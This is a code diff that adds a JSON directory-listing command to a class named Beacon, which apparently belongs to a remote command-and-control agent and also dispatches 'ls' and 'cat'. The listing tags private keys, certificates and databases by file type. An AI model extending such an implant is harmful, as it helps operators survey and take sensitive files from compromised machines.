@@ -383,6 +383,72 @@ class Beacon:
         except Exception as e:
             return f"[error: {e}]"
 
+    def _exec_lsjson(self, path: str = ".") -> str:
+        try:
+            p = Path(path)
+            if not p.exists():
+                return json.dumps({"error": f"{path}: No such file or directory"})
+            entries = []
+            for entry in sorted(p.iterdir()):
+                try:
+                    st = entry.stat()
+                    info = {
+                        "name": entry.name,
+                        "path": str(entry.resolve()),
+                        "is_dir": entry.is_dir(),
+                        "is_link": entry.is_symlink(),
+                        "size": st.st_size,
+                        "mode": stat.filemode(st.st_mode),
+                        "mtime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
+                        "atime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_atime)),
+                        "ctime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_ctime)),
+                    }
+                    if entry.is_symlink():
+                        try:
+                            info["link_target"] = str(entry.resolve())
+                        except Exception:
+                            info["link_target"] = "?"
+                    ext = entry.suffix.lower()
+                    if entry.is_dir():
+                        info["type"] = "directory"
+                    elif ext in (".py", ".js", ".ts", ".sh", ".bash", ".ps1", ".rb", ".go",
+                                 ".c", ".h", ".cpp", ".rs", ".java", ".cs", ".php", ".pl"):
+                        info["type"] = "code"
+                    elif ext in (".txt", ".md", ".rst", ".log", ".csv", ".json", ".xml",
+                                 ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf"):
+                        info["type"] = "text"
+                    elif ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg", ".ico"):
+                        info["type"] = "image"
+                    elif ext in (".zip", ".tar", ".gz", ".bz2", ".xz", ".7z", ".rar"):
+                        info["type"] = "archive"
+                    elif ext in (".exe", ".dll", ".so", ".dylib", ".elf", ".bin"):
+                        info["type"] = "binary"
+                    elif ext in (".key", ".pem", ".crt", ".cer", ".p12", ".pfx", ".jks"):
+                        info["type"] = "cert"
+                    elif ext in (".db", ".sqlite", ".sqlite3", ".mdb"):
+                        info["type"] = "database"
+                    else:
+                        info["type"] = "file"
+                    try:
+                        if platform.system() != "Windows":
+                            import pwd
+                            import grp
+                            info["owner"] = pwd.getpwuid(st.st_uid).pw_name
+                            info["group"] = grp.getgrgid(st.st_gid).gr_name
+                        else:
+                            info["owner"] = ""
+                            info["group"] = ""
+                    except Exception:
+                        info["owner"] = str(st.st_uid) if hasattr(st, "st_uid") else ""
+                        info["group"] = str(st.st_gid) if hasattr(st, "st_gid") else ""
+                    entries.append(info)
+                except OSError:
+                    entries.append({"name": entry.name, "error": True})
+            return json.dumps({"path": str(p.resolve()), "entries": entries,
+                               "count": len(entries)})
+        except Exception as e:
+            return json.dumps({"error": str(e)})
+
     def _exec_cat(self, path: str) -> str:
         try:
             return Path(path).read_text(errors="replace")[:65536]
@@ -1085,6 +1151,8 @@ class Beacon:
 
             elif cmd == "ls":
                 output = self._exec_ls(args or ".")
+            elif cmd == "lsjson":
+                output = self._exec_lsjson(args or ".")
 
             elif cmd == "cat":
                 output = self._exec_cat(args)
